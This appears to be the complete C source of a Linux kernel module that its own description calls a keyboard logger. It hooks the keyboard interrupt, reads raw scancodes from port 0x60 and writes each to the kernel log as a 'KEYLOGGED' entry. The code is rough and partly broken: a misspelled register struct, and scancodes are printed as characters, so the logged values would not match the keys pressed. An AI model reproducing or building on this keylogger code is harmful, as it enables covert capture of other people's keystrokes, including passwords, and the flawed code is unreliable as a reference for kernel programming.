#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/init.h>
#include<linux/list.h>
#include<linux/interrupt.h>
#include<asm/io.h>
#include<linux/string.h>

#define KB_IRQ 1
MODULE_LICENSE("GPL");
MODULE_AUTHOR("DNYANESHWAR BHADANE");
MODULE_DESCRIPTION("This is intrupt keyboard logger  module");
MODULE_VERSION("0.01");


struct logger{
	unsigned char scancode;


}data;


void t_log(unsigned long dummy){
	printk(KERN_INFO "KEYLOGGED %c" , data.scancode);

}



DECLARE_TASKLET_OLD(my_tasklet, t_log);
irq_handler_t kb_irq_handler(int irq ,  void *dev_id , struct pr_regs *flags){
	
	printk("This is started hadnling");	
        data.scancode =	inb(0x60);
	tasklet_schedule(&my_tasklet);
	return (irq_handler_t) IRQ_HANDLED;

}


static int __init  entryFn(void){


	int ret;
	printk(KERN_INFO "SIMPLE MODULE");	
	ret = request_irq(KB_IRQ ,(irq_handler_t)kb_irq_handler, IRQF_SHARED , "CUSTOME HANDLER" , &data );
	if(ret != 0){
		printk(KERN_INFO "Error in keyboard");
	
	}
	printk(KERN_INFO "\nLOGGER INITIALIZATION COMPLETE\n");
	return 0;
}
static void __exit exitFn(void){
	printk(KERN_INFO "(********************************Module Exit\n");
	tasklet_kill(&my_tasklet);

        free_irq(KB_IRQ, &data);

        printk(KERN_INFO "keylogger: unloaded.");
}




module_init(entryFn);
module_exit(exitFn);


